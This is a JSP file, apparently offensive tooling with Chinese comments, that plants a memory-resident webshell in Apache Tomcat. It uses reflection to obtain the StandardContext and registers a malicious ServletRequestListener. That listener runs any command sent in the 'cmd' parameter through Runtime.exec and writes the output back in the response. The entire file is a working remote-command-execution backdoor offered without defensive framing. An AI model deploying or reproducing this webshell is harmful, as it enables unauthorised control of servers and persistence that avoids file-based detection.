<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%--声明一个恶意Filter--%>
<%!
    public class ListenerShell implements ServletRequestListener {
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            ServletRequest req = sre.getServletRequest();
            Class reqClass = req.getClass();
            try {
                Field field = reqClass.getDeclaredField("request");
                field.setAccessible(true);
                Response  resp = ((Request) field.get(req)).getResponse();
                String cmd = req.getParameter("cmd");
                if (cmd != null) {
                    Process proc = Runtime.getRuntime().exec(cmd);
                    BufferedReader br = new BufferedReader(
                            new InputStreamReader(proc.getInputStream()));
                    String line;
                    while ((line = br.readLine()) != null) {
                        resp.getWriter().println(line);
                    }
                    br.close();
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }

        }

        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {}


    }
%>
<%--从ServletContext中获取StandardContext--%>
<%
    // 从request中获取servletContext
    ServletContext servletContext = request.getServletContext();
    // 从servletContext中获取applicationContext
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    // 从applicationContext中获取standardContext
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>
<%--动态注册恶意Listener--%>
<%
    standardContext.addApplicationEventListener(new ListenerShell());
%>